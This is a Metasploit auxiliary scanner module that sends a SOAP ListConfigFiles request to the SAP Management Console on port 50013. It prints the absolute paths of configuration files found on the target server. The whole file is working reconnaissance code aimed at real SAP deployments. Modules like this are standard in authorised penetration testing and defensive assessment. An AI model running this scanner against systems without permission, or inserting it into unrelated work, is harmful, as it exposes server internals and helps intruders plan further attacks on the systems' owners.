##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'SAP Management Console List Config Files',
      'Description'  => %q{
        This module attempts to list the config files
        through the SAP Management Console SOAP Interface.
        Returns a list of config files found in the SAP configuration with its
        absolute paths inside the server filesystem.
        },
      'References'   =>
        [
          # General
          [ 'URL', 'http://blog.c22.cc' ]
        ],
      'Author'       => [
        'Chris John Riley', # Original msf module
        'Jacobo Avariento Gimeno' # Minor changes to adapt it for ListConfigFiles webmethod
      ],
      'License'      => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(50013),
        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
      ])
    register_autofilter_ports([ 50013 ])
  end

  def run_host(ip)
    res = send_request_cgi({
      'uri'      => normalize_uri(datastore['URI']),
      'method'   => 'GET'
    }, 25)

    if not res
      print_error("#{rhost}:#{rport} [SAP] Unable to connect")
      return
    end

    enum_instance(ip)
  end

  def enum_instance(rhost)
    print_status("#{rhost}:#{rport} [SAP] Connecting to SAP Management Console SOAP Interface")

    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
    xsi = 'http://www.w3.org/2001/XMLSchema-instance'
    xs = 'http://www.w3.org/2001/XMLSchema'
    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
    ns1 = 'ns1:ListConfigFiles'

    data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi
    data << '" xmlns:xs="' + xs + '">' + "\r\n"
    data << '<SOAP-ENV:Header>' + "\r\n"
    data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
    data << '<enableSession>true</enableSession>' + "\r\n"
    data << '</sapsess:Session>' + "\r\n"
    data << '</SOAP-ENV:Header>' + "\r\n"
    data << '<SOAP-ENV:Body>' + "\r\n"
    data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 + '>' + "\r\n"
    data << '</SOAP-ENV:Body>' + "\r\n"
    data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

    res = send_request_raw({
      'uri'      => normalize_uri(datastore['URI']),
      'method'   => 'POST',
      'data'     => data,
      'headers'  =>
        {
          'Content-Length' => data.length,
          'SOAPAction'     => '""',
          'Content-Type'   => 'text/xml; charset=UTF-8',
        }
    }, 15)

    unless res
      print_error("#{rhost}:#{rport} [SAP] Unable to connect")
      return
    end

    if res.code == 500 && res.body =~ %r{<faultstring>(.*)</faultstring>}i
      print_error("#{rhost}:#{rport} [SAP] Error code: #{$1.strip}")
      return
    end

    if res.code == 200 && res.body =~ %r{<item>([^<]+)</item>}i
      env = res.body.scan(%r{<item>([^<]+)</item>}i)
      print_good("#{rhost}:#{rport} [SAP] List of Config Files")
      env.each do |output|
        print_good(output.first)
      end
      return
    end

    print_error("#{rhost}:#{rport} [SAP] Failed to identify instance properties")
  rescue ::Rex::ConnectionError
    print_error("#{rhost}:#{rport} [SAP] Unable to connect")
  end
end
